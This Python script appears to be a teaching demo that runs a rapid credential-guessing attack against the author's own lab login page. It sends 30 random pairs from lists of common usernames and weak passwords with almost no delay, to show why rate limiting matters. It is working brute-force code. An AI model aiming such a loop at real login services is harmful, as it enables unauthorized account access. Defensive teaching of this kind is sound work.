#!/usr/bin/env python3
"""
Rapid-Fire Bot Attack Simulation
High-speed automated login attempts with minimal delays
Demonstrates why rate limiting is critical
"""

import requests
import time
from datetime import datetime
import random

# Target configuration
TARGET_URL = "https://jasonklutts.com/lab/login"

# Bot behavior: tries random combinations rapidly
USERNAMES = ["admin", "root", "user", "test", "administrator", "webadmin"]
PASSWORDS = ["123456", "password", "admin", "root", "test", "letmein", "qwerty", "12345678"]

def attempt_login(username, password):
    """
    Attempt a single login with given credentials
    """
    try:
        data = {
            'username': username,
            'password': password
        }
        
        response = requests.post(TARGET_URL, data=data, verify=True, timeout=5)
        
        return response.status_code
    
    except requests.exceptions.RequestException as e:
        return None

def run_rapid_attack(num_attempts=30):
    """
    Execute rapid-fire bot attack
    """
    print("=" * 60)
    print("RAPID-FIRE BOT ATTACK SIMULATION")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Attack speed: MAXIMUM (no delays)")
    print(f"Attempts planned: {num_attempts}")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()
    
    start_time = time.time()
    successful_requests = 0
    failed_requests = 0
    
    for i in range(1, num_attempts + 1):
        # Randomly select username and password
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        
        print(f"[{i}/{num_attempts}] {username}:{password}", end=" ")
        
        status = attempt_login(username, password)
        
        if status:
            successful_requests += 1
            print(f"✓ ({status})")
        else:
            failed_requests += 1
            print("✗ (timeout/error)")
        
        # Minimal delay - this is what makes it "bot-like"
        time.sleep(0.1)
    
    end_time = time.time()
    duration = end_time - start_time
    
    print()
    print("=" * 60)
    print("ATTACK COMPLETE")
    print("=" * 60)
    print(f"Total attempts: {num_attempts}")
    print(f"Successful requests: {successful_requests}")
    print(f"Failed requests: {failed_requests}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Average speed: {num_attempts/duration:.2f} requests/second")
    print(f"Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    print("This rapid pattern would trigger rate limiting in production systems")
    print("Check logs with: python3 analyze_logs.py")
    print("=" * 60)

if __name__ == '__main__':
    import sys
    
    # Check if running with --auto flag (for dashboard)
    if len(sys.argv) > 1 and sys.argv[1] == '--auto':
        run_rapid_attack(30)
    else:
        print("\n⚠️  WARNING: This is for educational purposes on YOUR OWN infrastructure only\n")
        print("This simulates a high-speed automated bot attack")
        print()
        
        response = input("Continue with rapid attack simulation? (yes/no): ")
        
        if response.lower() == 'yes':
            run_rapid_attack(30)
        else:
            print("Attack cancelled.")
